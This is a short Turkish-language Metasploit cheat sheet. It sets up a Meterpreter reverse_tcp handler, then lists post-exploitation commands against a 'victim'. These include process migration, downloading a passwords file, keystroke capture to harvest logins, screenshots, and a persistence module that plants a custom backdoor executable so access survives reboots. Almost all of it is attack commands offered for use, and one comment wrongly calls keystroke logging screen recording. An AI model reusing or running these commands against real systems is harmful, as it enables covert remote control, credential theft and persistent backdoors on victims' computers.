### Meterpreter

> msfconsole
> use exploit>multi>handler
> msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
> msf exploit(multi/handler) > show options
> msf exploit(multi/handler) > set LHOST 10.0.2.15
> msf exploit(multi/handler) > exploit
> msf exploit(multi/handler) > sessions -l
> msf exploit(multi/handler) > sessions -1
> meterpreter > background //geri gitmek için
> meterpreter > sysinfo // hedef sistem hakkında bilgi almak için
> meterpreter > help //kurbana yapılabilecek saldırıları gösterir
> meterpreter > ps //hedef sistemde çalışan işlemleri (process) listelemek için
> meterpreter > migrate 2824 // mevcut Meterpreter oturumunu başka bir çalışan process içine taşır.Yani payload artık yeni process içinde çalışır. 2824 açık olan çalışan process içinde trojenimizin id numarası
> meterpreter > download mysecretpasswords.txt // kurbanın cihazındaki dosyayı kendi cihazına indirir
> meterpreter > keyscan_start // kurbanın ekran kaydı başlar
> meterpreter > keyscan_dump // kurbanın ekran kaydı süresince giriş yaptığı,site,password,kullanıcı adı.. her şey çıkar
> meterpreter > screenshot // kurbanın ekran görüntüsünü alır. /root klasörüne konumlanır

**_ Bağlantıyı Sürdürebilir Hale Getirmek _**

> meterpreter > background //geri gitmek için
> use exploit>windows>local>persistence //modülün amacı genelde erişim kalıcılığı (persistence) sağlamaktır
> msf exploit(persistence) > show options //required kısımlar doldurulur
> msf exploit(persistence) > set SESSION 1
> msf exploit(persistence) > show advanced //diğer ayarlar
> msf exploit(persistence) > set EXE::Custom /var/www/html/backdoors/newpayload.exe //kendi .exe dosyamızı koymak istersek
> msf exploit(persistence) > exploit //kalıcı olarak kurbanın sistemine erişim sağlandı. Kurban cihazı kapatıp açsa dahi bağlantı gitmez
> msf exploit(persistence) > use exploit/multi/handler
> msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
> msf exploit(multi/handler) > exploit
